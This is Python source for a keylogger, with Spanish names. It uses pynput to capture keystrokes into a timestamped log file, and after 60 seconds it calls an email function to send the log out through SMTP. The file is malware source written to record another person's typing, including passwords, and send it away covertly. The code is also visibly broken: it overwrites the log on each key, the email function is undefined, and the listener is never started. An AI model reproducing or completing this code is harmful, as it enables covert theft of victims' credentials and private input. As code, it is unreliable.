import datetime
import getpass

from pynput.keyboard import Listener

import time
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
import getpass
import os

fecha = datetime.datetime.now().strftime('%d-%m-%Y %H-%M-%S')

tiempoInicial = time.time()

def grabarDatos(key):
    archivoConLosDatos = open('keylogger_{}.txt'.format(fecha), 'w')
    key = str(key)

    if key == 'key.enter':
        archivoConLosDatos.write('/n')
    elif key == 'Key.space':
        archivoConLosDatos.write(' ')
    elif key == 'Key.backspace':
        archivoConLosDatos.write('%BORRAR%')
    elif key == '<65027>':
        archivoConLosDatos.write('%ARROBA%')
    else:
        archivoConLosDatos.write(key.replace( "'", ""))

    if time.time() -tiempoInicial > 60:
        archivoConLosDatos.close()
        enviarMail(archivoConLosDatos)
        quit()

